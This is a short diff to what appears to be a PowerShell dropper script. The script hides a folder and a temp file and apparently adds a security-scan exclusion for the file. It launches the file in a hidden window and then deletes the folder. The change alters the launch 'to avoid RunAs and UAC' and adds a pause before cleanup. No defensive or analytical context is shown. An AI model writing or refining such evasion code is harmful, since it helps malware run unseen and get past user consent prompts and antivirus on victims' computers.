@@ -31,7 +31,9 @@ try {
     Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value $hiddenAttr
     Set-ItemProperty -Path $tempPath -Name Attributes -Value $hiddenAttr
     Add-Exclusion -Path $tempPath
-    Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs -Wait
+    # Changed this line to avoid RunAs and UAC
+    Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -NoNewWindow
+    Start-Sleep -Seconds 2  # Give it a moment to run
     Remove-Item $hiddenFolder -Recurse -Force
 } catch {
     exit 1
